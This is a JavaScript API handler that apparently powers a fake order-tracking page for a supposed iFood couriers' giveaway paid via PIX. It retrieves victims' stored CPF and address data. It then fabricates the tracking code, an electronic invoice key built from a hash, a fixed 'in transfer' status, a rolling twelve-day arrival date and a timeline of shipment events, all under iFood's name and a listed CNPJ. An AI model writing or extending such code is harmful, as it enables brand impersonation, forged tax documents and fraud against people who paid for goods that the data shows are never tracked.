const { getSettingsState } = require('../../lib/settings-store');
const { findLeadForTracking, updateLeadBySessionId } = require('../../lib/lead-store');
const { generateTrackingCode, resolveProductDetails } = require('../../lib/email-sender');

function hashString(str) {
    let hash = 0;
    const s = String(str || '');
    for (let i = 0; i < s.length; i++) {
        hash = ((hash << 5) - hash) + s.charCodeAt(i);
        hash |= 0;
    }
    return Math.abs(hash);
}

function formatCpfMask(rawCpf) {
    const digits = String(rawCpf || '').replace(/\D/g, '');
    if (digits.length === 11) {
        return `***.${digits.slice(3, 6)}.${digits.slice(6, 9)}-**`;
    }
    if (digits.length > 6) {
        return `***.${digits.slice(0, 3)}.${digits.slice(3, 6)}-**`;
    }
    return '***.482.910-**';
}

function generateNfeKey(seed) {
    const num = String(hashString(seed)).padEnd(10, '0');
    return `3526 1114 3802 0000 0121 5500 1000 ${num.slice(0, 4)} ${num.slice(4, 8)} 8274 8192`;
}

module.exports = async (req, res) => {
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');

    const method = req.method;
    if (method !== 'GET' && method !== 'POST') {
        res.status(405).json({ error: 'Method not allowed' });
        return;
    }

    let inputCode = '';
    let inputCpf = '';
    let inputProduct = '';
    if (method === 'GET') {
        inputCode = String(req.query?.codigo || req.query?.code || req.query?.id || '').trim();
        inputCpf = String(req.query?.cpf || req.query?.doc || '').trim();
        inputProduct = String(req.query?.produto || req.query?.item || req.query?.reward || '').trim().toLowerCase();
    } else {
        const body = typeof req.body === 'string' ? JSON.parse(req.body || '{}') : req.body || {};
        inputCode = String(body?.codigo || body?.code || body?.id || '').trim();
        inputCpf = String(body?.cpf || body?.doc || '').trim();
        inputProduct = String(body?.produto || body?.item || body?.reward || '').trim().toLowerCase();
    }

    // Determine query string and if it looks like a CPF
    const queryTerm = inputCpf || inputCode || '';
    const digitsOnly = queryTerm.replace(/\D/g, '');
    const isCpfQuery = digitsOnly.length === 11;
    const cleanCpf = isCpfQuery ? digitsOnly : (inputCpf.replace(/\D/g, '').length === 11 ? inputCpf.replace(/\D/g, '') : '');

    // Search Database for matching lead
    let lead = null;
    let matchType = null;
    try {
        const searchInput = {
            code: inputCode,
            cpf: cleanCpf || (isCpfQuery ? digitsOnly : '')
        };
        const leadRes = await findLeadForTracking(searchInput);
        if (leadRes?.ok && leadRes?.data) {
            lead = leadRes.data;
            matchType = leadRes.matchType;
        }
    } catch (err) {
        console.warn('Erro ao consultar lead no banco para rastreio:', err);
    }

    const settingsState = await getSettingsState().catch(() => ({ settings: null }));
    const posvendaConfig = settingsState?.settings?.posvenda || {
        carrierDefault: 'Correios Sedex / iFood Logística Express',
        deliveryDaysMin: 8,
        deliveryDaysMax: 16,
        supportEmail: 'suporte@entregadoresifood.com',
        companyName: 'iFood Logística & Distribuição Brasil Ltda',
        companyCnpj: '14.380.200/0001-21'
    };

    if (!lead) {
        res.status(200).json({
            ok: false,
            foundInDatabase: false,
            code: isCpfQuery ? '' : inputCode.toUpperCase(),
            error: 'Nenhum pedido localizado para este CPF ou código de rastreio na base de dados.'
        });
        return;
    }

    const payload = lead.payload || {};
    const personal = payload.personal || {};
    const shipping = payload.shipping || {};
    const extra = payload.extra || {};
    const addressObj = payload.address || {};

    const customerName = String(lead.name || personal.name || 'Parceiro iFood').trim();
    const rawLeadCpf = String(lead.cpf || personal.cpf || cleanCpf || '').replace(/\D/g, '');
    const customerCpf = rawLeadCpf ? formatCpfMask(rawLeadCpf) : '***.***.***-**';

    const cityLine = String(addressObj.cityLine || '').trim();
    const [parsedCityFromLine, parsedStateFromLine] = cityLine.includes(' - ')
        ? cityLine.split(' - ').map((s) => s.trim())
        : [cityLine, ''];

    let street = String(lead.address_line || addressObj.street || addressObj.streetLine || shipping.address || '').trim();
    const number = String(lead.number || extra.number || shipping.number || '').trim();
    const complement = String(lead.complement || extra.complement || shipping.complement || '').trim();
    const neighborhood = String(lead.neighborhood || addressObj.neighborhood || shipping.neighborhood || '').trim();
    const city = String(lead.city || addressObj.city || shipping.city || parsedCityFromLine || '').trim();
    const state = String(lead.state || addressObj.state || shipping.state || parsedStateFromLine || '').trim().toUpperCase();
    const rawZip = String(lead.cep || addressObj.cep || shipping.cep || '').replace(/\D/g, '');
    const zip = rawZip.length === 8 ? `${rawZip.slice(0, 5)}-${rawZip.slice(5)}` : String(lead.cep || addressObj.cep || shipping.cep || '').trim();
    const reference = String(lead.reference || extra.reference || '').trim();

    if (street && neighborhood && street.toLowerCase().endsWith(`, ${neighborhood.toLowerCase()}`)) {
        street = street.slice(0, -(neighborhood.length + 2)).trim();
    }

    const addressShort = city && state ? `${city} - ${state}` : (city || state || 'Endereço em processamento');

    const addrParts = [
        street ? `${street}${number ? `, Nº ${number}` : (extra.noNumber ? ', s/n' : '')}${complement ? ` (${complement})` : ''}` : '',
        neighborhood ? `Bairro ${neighborhood}` : '',
        city && state ? `${city} - ${state}` : (city || state || ''),
        zip ? `CEP: ${zip}` : '',
        reference ? `Ref: ${reference}` : ''
    ].filter(Boolean);

    const fullAddressText = addrParts.length > 0
        ? addrParts.join(', ')
        : 'Endereço em conferência logística';

    const leadProductInput = String(payload.reward?.id || payload.reward?.name || payload.offerLabel || payload.product || inputProduct || '');

    let targetCode = '';
    let isNewCodeGenerated = false;
    if (payload.trackingCode) {
        targetCode = String(payload.trackingCode).trim().toUpperCase();
    } else {
        targetCode = generateTrackingCode(lead.pix_txid || lead.session_id || rawLeadCpf || Date.now());
        isNewCodeGenerated = true;

        if (lead.session_id) {
            updateLeadBySessionId(lead.session_id, {
                payload: {
                    ...payload,
                    trackingCode: targetCode
                }
            }).catch(() => null);
        }
    }

    let purchaseDate = null;
    if (lead.created_at || lead.updated_at) {
        purchaseDate = new Date(lead.created_at || lead.updated_at);
    }

    const seed = targetCode + (rawLeadCpf || cleanCpf || '');
    const numSeed = hashString(seed);

    // Delivery delay calculation: 8 to 16 business days ahead (prolonged delivery)
    const now = new Date();
    const effectivePurchaseDate = purchaseDate && !isNaN(purchaseDate.getTime()) ? purchaseDate : new Date(now.getTime() - (36 * 60 * 60 * 1000));
    const nfeDate = new Date(effectivePurchaseDate.getTime() + (45 * 60 * 1000));
    const packedDate = new Date(effectivePurchaseDate.getTime() + (12 * 60 * 60 * 1000));
    const dispatchedDate = new Date(Math.max(packedDate.getTime() + (12 * 60 * 60 * 1000), now.getTime() - (8 * 60 * 60 * 1000)));
    const estimatedArrival = new Date(now.getTime() + (12 * 24 * 60 * 60 * 1000));

    const formatDate = (d) => {
        return d.toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit', year: 'numeric' }) + ' às ' +
               d.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
    };

    const formatDateOnly = (d) => {
        return d.toLocaleDateString('pt-BR', { weekday: 'long', day: '2-digit', month: 'long', year: 'numeric' });
    };

    // Product selector logic (Bag, Baú ou Kit)
    const rawProd = (leadProductInput || inputProduct || '').toLowerCase();
    let resolvedProduct = {
        id: 'bag',
        title: 'Bag Térmica iFood Oficial - Linha Entregador Pro (45 Litros)',
        model: 'Modelo Oficial iFood Reforçado 2026',
        sku: 'IF-BAG-PRO-45L',
        image: '/assets/bagfoto.webp',
        items: [
            '1x Bag Térmica impermeável com faixas refletivas',
            '1x Isopor interno térmico de alta densidade',
            '1x Divisória ajustável para pizzas e marmitas',
            'Alças anatômicas acolchoadas com trava peitoral'
        ],
        warranty: '90 dias de Garantia Legal (Art. 26 CDC) contra defeitos de fabricação'
    };

    if (rawProd.includes('bau') || rawProd.includes('baú')) {
        resolvedProduct = {
            id: 'bau',
            title: 'Baú de Carga para Moto iFood Oficial (80 Litros)',
            model: 'Modelo Baú Homologado iFood - Polipropileno Injetado',
            sku: 'IF-BAU-MOTO-80L',
            image: '/assets/__task____isolate_ifood_delivery_box_white_background_,_202603260112 (1).webp',
            items: [
                '1x Baú iFood 80L em polipropileno de alta resistência',
                '1x Fechadura reforçada com chave dupla',
                '1x Suporte metálico universal com parafusos de fixação',
                'Faixas refletivas homologadas DENATRAN/Contran'
            ],
            warranty: '90 dias de Garantia Legal (Art. 26 CDC) contra defeitos de fabricação'
        };
    } else if (rawProd.includes('kit') || rawProd.includes('jaqueta')) {
        resolvedProduct = {
            id: 'kit_entregador',
            title: 'Kit Entregador iFood Oficial Completo (Jaqueta + Bag + Acessórios)',
            model: 'Kit Oficial Pro iFood 2026',
            sku: 'IF-KIT-ENTREGADOR-PRO',
            image: '/assets/__task____fix_ifood_logo_on_jacket_,_202603260102 (1).webp',
            items: [
                '1x Jaqueta Térmica Impermeável iFood com Faixas Refletivas',
                '1x Bag Térmica Oficial 45L com Isopor Interno',
                '1x Divisória interna para acomodação de pedidos',
                '1x Suporte veicular reforçado anti-vibração'
            ],
            warranty: '90 dias de Garantia Legal (Art. 26 CDC) contra defeitos de fabricação'
        };
    }

    const destinationLabel = addressShort !== 'Endereço em processamento' ? addressShort : 'Endereço de destino';
    const orderData = {
        ok: true,
        foundInDatabase: true,
        matchType: matchType || 'code_lookup',
        isNewCodeGenerated: isNewCodeGenerated,
        code: targetCode.toUpperCase(),
        carrier: String(lead.shipping_name || shipping.name || posvendaConfig.carrierDefault || 'Correios Sedex / iFood Logística Express').trim(),
        status: 'em_transferencia',
        statusLabel: 'Em transferência para Unidade de Triagem e Distribuição',
        statusCode: 2,
        progressPercent: 30, // 30% progress bar
        estimatedDeliveryDate: formatDateOnly(estimatedArrival),
        estimatedDays: '8 a 15 dias úteis (Prazo com triagem e inspeção fiscal)',
        company: {
            name: posvendaConfig.companyName || 'iFood Logística & Distribuição Brasil Ltda',
            cnpj: posvendaConfig.companyCnpj || '14.380.200/0001-21',
            supportEmail: posvendaConfig.supportEmail || 'suporte@entregadoresifood.com'
        },
        nfe: {
            number: `00${(numSeed % 80000 + 10000)}`,
            series: '1',
            key: generateNfeKey(seed),
            issuedAt: formatDate(nfeDate),
            amount: 'R$ 0,00 (Item Bonificado pelo Programa Entregadores iFood)',
            taxes: 'ICMS / ISSQN recolhido na origem'
        },
        product: resolvedProduct,
        recipient: {
            name: customerName,
            document: customerCpf,
            address: fullAddressText,
            addressShort: addressShort,
            city,
            state,
            cep: zip
        },
        deliveryNotice: 'Devido ao grande volume de expedição nos Centros de Distribuição, o prazo operacional de entrega é de 8 a 15 dias úteis. As atualizações oficiais são enviadas para o seu e-mail cadastrado.',
        timeline: [
            {
                step: 'Em transferência para Unidade de Triagem de destino',
                status: 'current',
                date: formatDate(dispatchedDate),
                location: `Centro de Distribuição Regional → Unidade Destino (${destinationLabel})`,
                description: `Carga em rota de transferência com destino final para ${destinationLabel}. Próxima atualização ao dar entrada na base de distribuição local.`
            },
            {
                step: 'Objeto postado e integrado ao lote logístico',
                status: 'completed',
                date: formatDate(packedDate),
                location: 'Centro de Distribuição iFood Logística',
                description: 'Volume conferido, embalado e despachado pela transportadora parceira com seguro de carga.'
            },
            {
                step: 'Nota Fiscal Eletrônica (DANFE) emitida',
                status: 'completed',
                date: formatDate(nfeDate),
                location: state ? `Secretaria da Fazenda Estadual (SEFAZ/${state})` : 'Secretaria da Fazenda Estadual (SEFAZ)',
                description: `DANFE autorizada sob a Chave de Acesso: ${generateNfeKey(seed).slice(0, 24)}...`
            },
            {
                step: 'Pagamento aprovado via PIX & Pedido registrado',
                status: 'completed',
                date: formatDate(effectivePurchaseDate),
                location: payload?.pixGateway ? `Gateway PIX (${String(payload.pixGateway).toUpperCase()})` : 'Gateway de Pagamento Integrado',
                description: 'Transação PIX aprovada com sucesso. Pedido enviado para a esteira de separação.'
            }
        ]
    };

    res.status(200).json(orderData);
};
